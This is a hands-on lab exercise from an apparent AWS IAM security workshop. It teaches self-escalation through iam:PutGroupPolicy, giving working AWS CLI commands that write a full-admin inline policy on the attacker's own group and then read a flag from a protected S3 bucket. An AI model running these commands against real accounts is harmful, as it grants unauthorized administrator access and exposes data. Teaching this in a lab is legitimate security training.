## Exercise 2: PutGroupPolicy - Self-Escalation via Groups

**Category:** Self-Escalation
**Starting point identity:** `iamws-group-admin-user`

**The Vulnerability:** The `iamws-group-admin-user` has `iam:PutGroupPolicy` with `Resource: "*"`, allowing them to write arbitrary inline policies on ANY IAM group. Since they're a member of `iamws-dev-team`, they can write an admin policy on that group—immediately granting themselves full access.

### Part A: Query permissions with pmapper

pmapper can answer specific questions about what principals can and can't do. In your terminal, try the following query.

```bash
pmapper query "can user/iamws-group-admin-user do iam:PutGroupPolicy with *"
```

Expected output:
```
user/iamws-group-admin-user IS authorized to call action
iam:PutGroupPolicy for resource *
```

**What this means:** The user can write inline policies on ANY group—including groups they belong to.

### Part B: Understand the Attack Conceptually

Visit [pathfinding.cloud IAM-011](https://pathfinding.cloud/paths/iam-011) to explore and learn more about this type of path.

### Part C: Exploit the Vulnerability

> [!TIP]
> The `--profile` flag tells the AWS CLI to use a specific named profile's credentials for that single command, without affecting your shell environment. Each exercise uses a different profile to act as the attacker.

**Step 1: Verify your attacker identity**
```bash
aws sts get-caller-identity --profile iamws-group-admin-user
```

You should see you're now operating as `iamws-group-admin-user`.

**Step 2: Try to access the crown jewels**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-group-admin-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-group-admin-user
```

**Expected Output:** `AccessDenied`

```
download failed: s3://iamws-crown-jewels-072054739058/flag.txt to - An error occurred (403) when calling the HeadObject operation: Forbidden
```

this low-privilege user can't reach the crown jewels... yet.

**Step 3: Check which groups your user is part of**

### Check which groups the attacker belongs to
```
aws iam list-groups-for-user --user-name iamws-group-admin-user \
  --query 'Groups[].GroupName' --output table \
  --profile iamws-group-admin-user
```

You'll see the user is a member of `iamws-dev-team`.

**Step 4: View the current benign inline policy**
```bash
# List inline policies on the group
aws iam list-group-policies --group-name iamws-dev-team \
  --profile iamws-group-admin-user

# Read the current policy (read-only permissions)
aws iam get-group-policy \
  --group-name iamws-dev-team \
  --policy-name iamws-dev-team-readonly \
  --query 'PolicyDocument' --output json \
  --profile iamws-group-admin-user
```

Note the limited permissions (EC2 read-only).

**Step 5: Write an admin inline policy on the group**
```bash
aws iam put-group-policy \
  --group-name iamws-dev-team \
  --policy-name iamws-dev-team-escalated \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }' \
  --profile iamws-group-admin-user
```

**Step 6: Verify the escalation — claim the crown jewels**
```bash
# Now grab the crown jewels
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-group-admin-user
```

**You just escalated a group admin to full administrator** by writing an inline policy on a group you belong to. The crown jewels are yours — every member of `iamws-dev-team` is now also an admin.

---

**Next:** [Exercise 3: CreatePolicyVersion](exercise-3.md) — Self-escalation via policy version manipulation
